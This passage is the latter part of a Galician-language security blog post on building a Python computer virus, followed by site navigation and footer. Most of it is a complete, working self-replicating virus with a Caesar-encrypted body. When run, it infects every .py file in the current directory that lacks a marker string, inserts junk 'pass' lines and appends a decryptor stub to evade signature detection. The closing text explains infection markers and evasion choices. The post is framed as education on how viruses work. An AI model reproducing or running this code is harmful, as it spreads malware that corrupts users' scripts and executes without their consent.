+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Ola mundo!&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calcula_clave</span>(texto):
+    <span style="color:#66d9ef">pass</span>
+    <span style="color:#66d9ef">if</span> len(texto) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>:
+        clave <span style="color:#f92672">=</span> ord(texto[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> ord(texto[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> ord(texto[<span style="color:#ae81ff">2</span>])
+        <span style="color:#66d9ef">pass</span>
+        <span style="color:#66d9ef">pass</span>
+        <span style="color:#66d9ef">pass</span>
+    <span style="color:#66d9ef">else</span>:
+        clave <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> clave
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">descifra</span>(texto, clave):
+    texto_descifrado <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> caracter <span style="color:#f92672">in</span> texto:
+        <span style="color:#66d9ef">if</span> caracter<span style="color:#f92672">.</span>isupper():
+            texto_descifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">-</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> caracter<span style="color:#f92672">.</span>islower():
+            <span style="color:#66d9ef">pass</span>
+            <span style="color:#66d9ef">pass</span>
+            <span style="color:#66d9ef">pass</span>
+            texto_descifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">-</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            texto_descifrado <span style="color:#f92672">+=</span> caracter
+    <span style="color:#66d9ef">pass</span>
+    <span style="color:#66d9ef">return</span> texto_descifrado
+
+
+<span style="color:#f92672">import</span> sys
+portador <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+texto_portador <span style="color:#f92672">=</span> portador<span style="color:#f92672">.</span>read()
+portador<span style="color:#f92672">.</span>close()
+parte_sin_cifrar <span style="color:#f92672">=</span> texto_portador[texto_portador<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def calcula_clave&#34;</span>):texto_portador<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def calcula_clave&#34;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">650</span>]
+clave <span style="color:#f92672">=</span> calcula_clave(texto_portador)
+texto_descifrado <span style="color:#f92672">=</span> descifra(<span style="color:#e6db74">&#34;&#34;&#34;wxy vbykt(mxqmh, vetox):
+</span><span style="color:#e6db74">    mxqmh_vbyktwh = &#34;&#34;
+</span><span style="color:#e6db74">    yhk vtktvmxk bg mxqmh:
+</span><span style="color:#e6db74">        by vtktvmxk.blniixk():
+</span><span style="color:#e6db74">            mxqmh_vbyktwh += vak((hkw(vtktvmxk) + vetox - 65) % 26 + 65)
+</span><span style="color:#e6db74">        xeby vtktvmxk.blehpxk():
+</span><span style="color:#e6db74">            mxqmh_vbyktwh += vak((hkw(vtktvmxk) + vetox - 97) % 26 + 97)
+</span><span style="color:#e6db74">        xelx:
+</span><span style="color:#e6db74">            mxqmh_vbyktwh += vtktvmxk
+</span><span style="color:#e6db74">    kxmnkg mxqmh_vbyktwh
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy uhkkt_itll(vhwbzh):
+</span><span style="color:#e6db74">    vhwbzh_lxg_itll = []
+</span><span style="color:#e6db74">    yhk ebgat bg vhwbzh.liebm(vak(10)):
+</span><span style="color:#e6db74">        by ghm &#34;itll&#34; bg ebgat:
+</span><span style="color:#e6db74">            vhwbzh_lxg_itll.tiixgw(ebgat)
+</span><span style="color:#e6db74">    kxmnkg vak(10).chbg(vhwbzh_lxg_itll)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy vtevnet_mtunetvbhg(vhwbzh, ihlbvbhg):
+</span><span style="color:#e6db74">    by &#34;xelx&#34; bg vhwbzh[ihlbvbhg] hk &#34;xeby&#34; bg vhwbzh[ihlbvbhg]:
+</span><span style="color:#e6db74">        kxmnkg exg(vhwbzh[ihlbvbhg]) - exg(vhwbzh[ihlbvbhg].elmkbi()) + 4
+</span><span style="color:#e6db74">    kxmnkg exg(vhwbzh[ihlbvbhg]) - exg(vhwbzh[ihlbvbhg].elmkbi())
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy xgztwx_itll(vhwbzh):
+</span><span style="color:#e6db74">    bfihkm ktgwhf
+</span><span style="color:#e6db74">    ebgatl = vhwbzh.liebm(vak(10))
+</span><span style="color:#e6db74">    yhk b bg ktgzx(10):
+</span><span style="color:#e6db74">        by ktgwhf.ktgwhf() &gt; 0.75:
+</span><span style="color:#e6db74">            ihlbvbhg_bglxvbhg = ktgwhf.ktgwbgm(1, exg(ebgatl) - 1)
+</span><span style="color:#e6db74">            ebgatl.bglxkm(ihlbvbhg_bglxvbhg, &#34; &#34; * vtevnet_mtunetvbhg(ebgatl, ihlbvbhg_bglxvbhg) + &#34;itll&#34;)
+</span><span style="color:#e6db74">    kxmnkg vak(10).chbg(ebgatl)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy fhwbybvt(vhwbzh):
+</span><span style="color:#e6db74">    ghoh_vhwbzh = []
+</span><span style="color:#e6db74">    lxitktwhk = vak(10) + vak(10) + vak(10)
+</span><span style="color:#e6db74">    yngvbhgl = vhwbzh.liebm(lxitktwhk)
+</span><span style="color:#e6db74">    yhk mxqmh bg yngvbhgl:
+</span><span style="color:#e6db74">        by mxqmh:
+</span><span style="color:#e6db74">            vhwbzh_lxg_itll = uhkkt_itll(mxqmh)
+</span><span style="color:#e6db74">            vhwbzh_vhg_itll = xgztwx_itll(vhwbzh_lxg_itll)
+</span><span style="color:#e6db74">            ghoh_vhwbzh.tiixgw(vhwbzh_vhg_itll)
+</span><span style="color:#e6db74">        xelx:
+</span><span style="color:#e6db74">            ghoh_vhwbzh.tiixgw(mxqmh)
+</span><span style="color:#e6db74">    kxmnkg lxitktwhk.chbg(ghoh_vhwbzh)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy bgyxvmtk(obknl):
+</span><span style="color:#e6db74">    bfihkm hl
+</span><span style="color:#e6db74">    yhk tkjnboh bg hl.eblmwbk(&#34;.&#34;):
+</span><span style="color:#e6db74">        by tkjnboh.xgwlpbma(&#34;.ir&#34;):
+</span><span style="color:#e6db74">            lvkbim = hixg(tkjnboh, &#34;k+&#34;)
+</span><span style="color:#e6db74">            mxqmh_lvkbim = lvkbim.kxtw()
+</span><span style="color:#e6db74">            by &#34;wxy vtevnet_vetox&#34; ghm bg mxqmh_lvkbim:
+</span><span style="color:#e6db74">                itkmx_xg_vetkh = obknl[:obknl.ybgw(&#34;wxy vbykt&#34;)]
+</span><span style="color:#e6db74">                itkmx_t_vbyktk = obknl[obknl.ybgw(&#34;wxy vbykt&#34;):]
+</span><span style="color:#e6db74">                itkmx_xg_vetkh_fhwbybvtwt = fhwbybvt(itkmx_xg_vetkh)
+</span><span style="color:#e6db74">                vetox = vtevnet_vetox(mxqmh_lvkbim)
+</span><span style="color:#e6db74">                itkmx_vkbyktwt = vbykt(itkmx_t_vbyktk, vetox)
+</span><span style="color:#e6db74">                lvkbim.pkbmx(itkmx_xg_vetkh_fhwbybvtwt)
+</span><span style="color:#e6db74">                wxlvkbyktwhk = &#34;bfihkm lrl&#34; + vak(10) + &#34;ihkmtwhk = hixg(lrl.tkzo[0], &#34; + vak(34) + &#34;k&#34; + vak(34) + &#34;)&#34; + vak(10) + &#34;mxqmh_ihkmtwhk = ihkmtwhk.kxtw()&#34; + vak(10) + &#34;ihkmtwhk.vehlx()&#34; + vak(10) + &#34;itkmx_lbg_vbyktk = mxqmh_ihkmtwhk[mxqmh_ihkmtwhk.ybgw(&#34; + vak(34) + &#34;wxy vtevnet_vetox&#34; + vak(34) + &#34;):mxqmh_ihkmtwhk.ybgw(&#34; + vak(34) + &#34;wxy vtevnet_vetox&#34; + vak(34) + &#34;)+&#34; + lmk(exg(itkmx_xg_vetkh_fhwbybvtwt)) + &#34;]&#34; + vak(10) + &#34;vetox = vtevnet_vetox(mxqmh_ihkmtwhk)&#34; + vak(10) + &#34;mxqmh_wxlvbyktwh = wxlvbykt(&#34; + vak(34) + vak(34) + vak(34) + itkmx_vkbyktwt + vak(34) + vak(34) + vak(34) + &#34;, vetox)&#34; + vak(10) + &#34;xqxv(mxqmh_wxlvbyktwh)&#34; + vak(10) + &#34;xqxvnmt(itkmx_lbg_vbyktk + mxqmh_wxlvbyktwh)&#34;
+</span><span style="color:#e6db74">                lvkbim.pkbmx(wxlvkbyktwhk)
+</span><span style="color:#e6db74">            lvkbim.vehlx()
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy itrehtw():
+</span><span style="color:#e6db74">    ikbgm(&#34;Ynvaxl bgyxvmtwh&#34;)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy xqxvnmt(obknl):
+</span><span style="color:#e6db74">    bgyxvmtk(obknl)
+</span><span style="color:#e6db74">    itrehtw()&#34;&#34;&#34;</span>, clave)
+<span style="color:#66d9ef">exec</span>(texto_descifrado)
+executa(parte_sin_cifrar <span style="color:#f92672">+</span> texto_descifrado)
+</code></pre></div><p>Finalmente, hai que recordar que esta variante do virus coma a anterior, infectan aos arquivos que non conteñan a cadea 
+de caracteres “def calcula_clave”, polo que se nun programa ou script lexítimo existe esa cadea de caracteres, non será 
+infectado.</p>
+<h1 id="a-ter-en-conta">A ter en conta</h1>
+<h2 id="discriminación-de-arquivos">Discriminación de arquivos</h2>
+<p>Nas dúas últimas variantes do virus, sucede que á hora de ver se un arquivo está previamente infectado, comprobase se 
+contén a cadea de caracteres “def calcula_clave”. Cando un virus utiliza unha forma de detectarse a si mesmo, permite 
+que os analistas saiban esta mesma información, polo cal van a saber como detectar se un arquivo pode estar infectado 
+ou non.</p>
+<p>Por outra banda, se o virus non ten este mecanismo, pode ter problemas de sobreinfección. Isto é que o virus pode 
+infectar varias veces o mesmo arquivo. A sobreinfección dun ou varios arquivos desemboca en que o usuario perciba un 
+peor funcionamento á hora de executar un programa (ao fin e ao cabo, se se executa un programa infectado varias veces, 
+tardará en realizar a funcionalidade lexítima xa que tamén se executará o código de varias infeccións), xunto cunha 
+perda de espazo na memoria secundaria. Esta falta de rendemento e espazo fará que o usuario pense que algo vai mal, 
+facendo que leve a reparar o computador e por conseguinte se pare a infección.</p>
+<p>A forma na que o virus detectará se un arquivo está infectado ou non é moi importante á hora de crealo, xa que 
+determinará a propia virulencia deste, polo que sempre que se desenvolva un virus hai que ter esta cuestión presente.</p>
+<h2 id="proteccións-utilizadas">Proteccións utilizadas</h2>
+<p>As proteccións utilizadas (cifrado de código e inserción de “pass”) están encamiñadas a evadir a detección por 
+sinatura. Se se aplica unha técnica de detección mediante unha análise heurística ou análise por comportamento 
+terminarase descubrindo que este programa é un virus.</p>
+<p>Hai que aclarar que cando se ofusca un código nunha linguaxe compilada, cífranse as instrucións en ensamblador, polo 
+que a implantación desta técnica distará do que se propón aquí.</p>
+<h2 id="linguaxe">Linguaxe</h2>
+<p>Normalmente os virus (ou calquera tipo de malware) constrúense en linguaxes compiladas para evitar dependencias 
+externas. O uso de Python reduce a capacidade de infección do virus creado, xa que só será efectivo en computadoras que 
+teñan a linguaxe instalada e coa versión correcta.</p>
+<h1 id="conclusións">Conclusións</h1>
+<p>Nesta publicación viuse como funciona un virus xunto con algún dos seus mecanismos de defensa, así e todo este proceso 
+ten máis complexidade da explicada, xa que neste campo hai moitas máis formas de infección e proteccións.</p>
+<p>Quizais nun futuro se aborden en Hackliza outros temas coma a creación dun verme, o funcionamento dun cavity ou dun 
+rookit, pero polo de agora haberá que agardar.</p>
+<h1 id="referencias">Referencias</h1>
+<p>Filiol, E. (2004). <em>Computer viruses: from theory to application</em> (1st ed.). Springer</p>
+<p>Szor, P. (2005). <em>The Art of Computer Virus Researchand Defense</em> (1st ed.). Addison Wesley Professional</p>
+<p><a href="https://www.youtube.com/watch?v=2Ra1CCG8Guo">Writing Viruses for Fun, not Profit</a></p>
+<p><a href="https://www.emis.de/journals/IJOPCM/files/IJOPCM(vol.1.2.3.S.8).pdf">Computer Virus Strategies and Detection Methods</a></p>
+<p><a href="https://0xpat.github.io/Malware_development_part_1/">Malware development part 1</a></p>
+
+
+        
+          <div class="blog-tags">
+            
+              <a href="https://hackliza.gal//tags/python/">python</a>&nbsp;
+            
+              <a href="https://hackliza.gal//tags/malware/">malware</a>&nbsp;
+            
+              <a href="https://hackliza.gal//tags/obfuscation/">obfuscation</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://hackliza.gal/posts/hacker_manifesto/" data-toggle="tooltip" data-placement="top" title="Manifesto Hacker">&larr; Artigo anterior</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://hackliza.gal/posts/console_usability/" data-toggle="tooltip" data-placement="top" title="Truquiños para mellorar a usabilidade de programas de consola">Artigo siguiente &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+        
+          
+          <div class="disqus-comments">
+            <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hackliza" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+          </div>
+          
+        
+        
+      
+
+    </div>
+  </div>
+</div>
+
+      
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://github.com/hackliza" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/hackliza" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            <a href="" title="RSS">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2024
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://hackliza.gal/">Hackliza</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.74.3</a> alimentada &nbsp;&bull;&nbsp; Tema <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adaptado de <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+<script src="https://hackliza.gal/js/main.js"></script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://hackliza.gal/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
